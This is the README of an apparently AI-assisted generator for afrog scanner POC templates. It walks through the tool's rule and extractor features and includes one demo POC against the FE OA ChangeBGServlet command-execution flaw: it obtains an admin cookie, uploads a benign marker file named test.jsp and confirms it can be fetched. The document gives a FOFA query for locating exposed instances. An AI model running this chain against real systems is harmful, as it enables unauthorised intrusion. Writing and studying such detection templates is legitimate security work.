# afrog poc generation

基于ai编写的POC辅助生成工具，方便快速写poc，参考了`https://github.com/phith0n/xray-poc-generation`

POC编写函数文档:

- [afrog](https://github.com/zan8in/afrog)
- [Afrog POC 规则编写权威指南](https://github.com/zan8in/afrog/blob/main/docs/afrog-poc-guide.md)
- [afrog内置函数](https://github.com/zan8in/afrog/blob/main/docs/afrog-helper-function.m)

## PoC info

定义poc文件名称和描述漏洞信息等

## HTTP

直接将poc数据包放入HTTP中会自动解析

![image-20251023095428641](/assets/image-20251023095428641.png)

## set

基本上afrog poc常用的函数都已经内置了

![image-20251023095513272](/assets/image-20251023095513272.png)

支持一键使用oob，只要点击` 使用OOB ` 按钮

![image-20251023095824459](/assets/image-20251023095824459.png)

## rules

![image-20251023095914410](/assets/image-20251023095914410.png)

匹配条件支持 header，status，body，latency, oob 等

### status

![image-20251023100514099](/assets/image-20251023100514099.png)

### body

![image-20251023100537805](/assets/image-20251023100537805.png)

### header

![image-20251023100557307](/assets/image-20251023100557307.png)

### oob

![image-20251023100614928](/assets/image-20251023100614928.png)

### latency

![image-20251023100418222](/assets/image-20251023100418222.png)

### bytes

新增 `bytes` 用于将 set 变量或 hex 字符串转换为字节流进行匹配 例如：bytes(rand_str)

![image-20251205172959192](/assets/image-20251205172959192.png)

填入`set `设置的值 `rand_str` 

## Extractors 数据提取器

新增 Extractors  用于从响应中提取变量，供后续规则使用。

![image-20251205213443709](/assets/image-20251205213443709.png)

### 新建规则

![image-20251205214017169](/assets/image-20251205214017169.png)

填好正则就可以保存了

![image-20251205214109021](/assets/image-20251205214109021.png)

在第二个请求中，填入匹配符 `{{title['title']}}`

![image-20251205214727917](/assets/image-20251205214727917.png)

匹配结果

![image-20251205214755731](/assets/image-20251205214755731.png)

### demo poc

![image-20251205225309476](/assets/image-20251205225309476.png)

```
id: poc-feiqi-changebgservlet

info:
  name: poc-feiqi-ChangeBGServlet
  author: moda
  severity: high
  description: |
    飞企互联OA FEwork ChangeBGServlet 命令执行漏洞(QVD-2025-25776)
    
    FOFA：app="FE-协作平台"
  reference:
    - https://example.com
  tags: 飞企互联OA, rec

set:
  rand_str: randomLowercase(30)

rules:
  r0:
    request:
      method: POST
      path: /mobileKey
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) Chrome/88.0.772.137 Safari/537.36
        Content-Type: application/x-www-form-urlencoded
      body: userName=admin
    output:
      SCookie: '"Set-Cookie: (?P<SCookie>.+) Path=".bsubmatch(response.raw_header)'
    expression: response.status == 200 && response.body.bcontains(b"true")
  r1:
    request:
      method: POST
      path: /servlet/ChangeBGServlet
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Cookie: "{{SCookie['SCookie']}}"
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
      body: |
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk
        Content-Disposition: form-data; name="file"; filename="test.jsp"
        Content-Type: text/plain
        
        {{rand_str}}
        ------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
    output:
      Paths: '"\"saveName\":\"(?P<Paths>.+)\",".bsubmatch(response.body)'
    expression: response.status == 200
  r2:
    request:
      method: GET
      path: /login/applyTheme/images/porttal/login/{{Paths['Paths']}}
      headers:
        Cookie: "{{SCookie['SCookie']}}"
    expression: response.status == 200 && response.body.bcontains(bytes(rand_str))

expression: r0() && r1() && r2()

```



## 本地运行

下载源码

```javascript
npm install
npm run dev
npm run build // 编译
```

编译完成后，Web目录在`dist/`文件夹。

![image-20251023101134603](/assets/image-20251023101134603.png)